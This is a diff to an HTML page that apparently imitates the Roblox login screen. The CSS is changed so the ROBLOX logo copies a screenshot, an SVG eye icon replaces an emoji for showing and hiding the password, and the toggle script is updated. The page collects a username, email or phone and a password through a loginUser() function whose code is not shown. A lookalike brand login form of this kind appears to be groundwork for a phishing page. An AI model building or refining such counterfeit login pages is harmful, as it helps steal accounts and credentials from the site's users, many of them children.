@@ -82,35 +82,42 @@
             z-index: 10;
         }
 
-        /* Идеальный брендовый логотип Roblox с наклонным квадратом-о */
+        /* Точный логотип по твоему скриншоту */
         .roblox-logo {
-            font-size: 40px;
+            font-size: 44px;
             font-weight: 900;
             letter-spacing: -1px;
             color: #fff;
             margin-bottom: 30px;
             text-transform: uppercase;
-            display: inline-flex;
+            display: flex;
             align-items: center;
         }
-        .roblox-logo .o-icon {
-            display: inline-block;
-            width: 24px;
-            height: 32px;
-            background: #fff;
-            border-radius: 5px;
-            margin: 0 2px;
-            transform: rotate(-12deg) skewX(-5deg);
-            position: relative;
+
+        .roblox-logo .r-normal {
+            letter-spacing: -2px;
         }
-        .roblox-logo .o-icon::after {
+
+        .roblox-logo .o-tilted-box {
+            display: inline-block;
+            width: 32px;
+            height: 38px;
+            background: #fff;
+            border-radius: 6px;
+            margin: 0 4px 0 2px;
+            transform: rotate(14deg);
+            position: relative;
+            top: -2px;
+        }
+
+        .roblox-logo .o-tilted-box::after {
             content: "";
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            width: 10px;
-            height: 16px;
+            width: 13px;
+            height: 18px;
             background: #0d0f12;
             border-radius: 2px;
         }
@@ -139,7 +146,7 @@
             color: #9ca3af;
         }
 
-        /* Фулл серый глазик без изменения цвета и прозрачности при клике */
+        /* Фулл-серый глазик */
         .eye-btn {
             position: absolute;
             right: 14px;
@@ -148,10 +155,16 @@
             background: none;
             border: none;
             cursor: pointer;
-            font-size: 18px;
             padding: 4px;
-            color: #9ca3af !important;
-            opacity: 1 !important;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .eye-btn svg {
+            width: 20px;
+            height: 20px;
+            fill: #8e949e !important;
         }
 
         .login-btn {
@@ -237,8 +250,9 @@
     </div>
 
     <div class="container">
-        <!-- Логотип Roblox с правильным наклонным «O» -->
-        <div class="roblox-logo">R<span class="o-icon"></span>BLOX</div>
+        <div class="roblox-logo">
+            <span class="r-normal">R</span><span class="o-tilted-box"></span>BLOX
+        </div>
 
         <div class="input-box">
             <input type="text" id="usernameInput" placeholder="Username/Email/Phone" oninput="checkInputs()">
@@ -246,7 +260,11 @@
 
         <div class="input-box">
             <input type="password" id="passwordInput" placeholder="Password" oninput="checkInputs()">
-            <button type="button" class="eye-btn" id="eyeToggle" onclick="togglePassword()">👁️</button>
+            <button type="button" class="eye-btn" id="eyeToggle" onclick="togglePassword()">
+                <svg id="eyeSvg" viewBox="0 0 24 24">
+                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                </svg>
+            </button>
         </div>
 
         <button id="loginBtn" class="login-btn" onclick="loginUser()">Log In</button>
@@ -277,10 +295,14 @@
 
         function togglePassword() {
             const passwordInput = document.getElementById('passwordInput');
+            const eyeSvg = document.getElementById('eyeSvg');
+            
             if (passwordInput.type === 'password') {
                 passwordInput.type = 'text';
+                eyeSvg.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2.81 2.81L1.39 4.22l3.05 3.05C3.12 8.72 2.06 10.25 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l4.41 4.41 1.41-1.41L2.81 2.81zM10.96 10.96l2.08 2.08c-.32.22-.71.36-1.04.36-1.1 0-2-.9-2-2 0-.33.14-.72.36-1.04z"/>';
             } else {
                 passwordInput.type = 'password';
+                eyeSvg.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3 z"/>';
             }
         }
 
